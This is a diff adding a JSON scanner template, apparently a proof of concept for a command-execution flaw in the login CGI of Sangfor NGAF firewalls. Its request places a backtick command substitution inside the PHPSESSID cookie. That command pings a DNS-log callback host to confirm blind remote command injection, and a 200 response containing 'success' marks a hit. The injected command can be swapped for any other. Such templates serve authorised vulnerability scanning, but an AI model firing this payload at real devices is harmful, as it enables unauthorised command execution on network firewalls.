@@ -1,0 +1,21 @@
+{
+	"name":"深信服NGAF命令执行漏洞",
+	"tag":"shenxinfu",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/cgi-bin/login.cgi",
+		"pocPost":"{\"opr\":\"login\", \"data\":{\"user\": \"watchTowr\" , \"pwd\": \"watchTowr\" , \"vericode\": \"EINW\" , \"privacy_enable\": \"0\"}}",
+		"header":{
+			"Cookie":" PHPSESSID=`$(ping -nc 1 {{dnslog}})`;",
+			"Accept":" */*",
+			"User-Agent":" Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
+			"Connection":" close",
+			"Host":" 127.0.0.1",
+			"Accept-Encoding":" gzip, deflate",
+			"Content-Length":" 111",
+			"Content-Type":" Application/X-www-Form"
+		},
+		"status_code":"200",
+		"pattern":"(success)"
+	}
+}
